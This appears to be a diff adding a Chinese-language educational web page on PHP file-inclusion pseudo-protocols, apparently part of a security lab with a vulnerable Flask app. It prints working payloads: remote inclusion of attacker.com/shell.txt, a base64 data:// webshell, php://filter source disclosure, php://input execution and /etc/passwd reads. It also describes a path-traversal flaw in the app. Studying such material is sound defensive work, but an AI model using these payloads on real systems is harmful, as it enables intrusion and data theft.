@@ -1,0 +1,58 @@
+<!-- 调试信息 - 伪协议演示页面 -->
+<h2>🌐 伪协议（Pseudo Protocol）知识</h2>
+
+<p>伪协议是在文件包含函数中使用的特殊协议标识，用于执行特定操作。虽然在 Python/Flask 环境中不如 PHP 常见，但理解其原理对 Web 安全分析至关重要。</p>
+
+<h3>1️⃣ HTTP 伪协议</h3>
+<p>允许文件包含函数从远程服务器获取内容，用于<strong>远程文件包含(RFI)</strong>和内网扫描。</p>
+<pre style="background:#f5f5f5;padding:10px;border-radius:4px;overflow-x:auto;">
+// PHP 示例 - 远程文件包含
+include('http://attacker.com/shell.txt');
+
+// PHP 示例 - 内网探测
+include('http://192.168.1.1/admin.php');
+
+// Python 示例
+import requests
+r = requests.get('http://target/fi?file=http://attacker/shell.txt')
+</pre>
+
+<h3>2️⃣ data 伪协议</h3>
+<p>允许直接在 URL 中嵌入数据内容，实现代码执行。</p>
+<pre style="background:#f5f5f5;padding:10px;border-radius:4px;overflow-x:auto;">
+// PHP 示例 - base64编码代码执行
+include('data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==');
+
+// 解码后为: &lt;?php system($_GET['cmd']); ?&gt;
+
+// Python - 读取元数据
+import base64
+data = "data:text/plain,hello"
+</pre>
+
+<h3>3️⃣ php:// 伪协议</h3>
+<p>允许访问各种 I/O 流，常用于读取源码和执行代码。</p>
+<pre style="background:#f5f5f5;padding:10px;border-radius:4px;overflow-x:auto;">
+// PHP 示例 - base64编码读取源码（绕过过滤器）
+index.php?page=php://filter/read=convert.base64-encode/resource=config.php
+
+// PHP 示例 - 通过POST发送代码执行
+POST /index.php?page=php://input
+Body: &lt;?php system('id'); ?&gt;
+</pre>
+
+<h3>4️⃣ file:// 伪协议</h3>
+<p>直接读取本地文件。</p>
+<pre style="background:#f5f5f5;padding:10px;border-radius:4px;overflow-x:auto;">
+// file协议读取本地文件
+file:///etc/passwd
+file:///C:/Windows/win.ini
+</pre>
+
+<h3>5️⃣ 实际影响</h3>
+<p>在本次 Flask 应用中，<code>/page?name=</code> 路由存在路径穿越漏洞，攻击者可以：</p>
+<ul>
+    <li>读取任意源文件（<code>../app.py</code>）</li>
+    <li>下载数据库文件（<code>../data/users.db</code>）</li>
+    <li>与上传的 WebShell 联动执行命令</li>
+</ul>
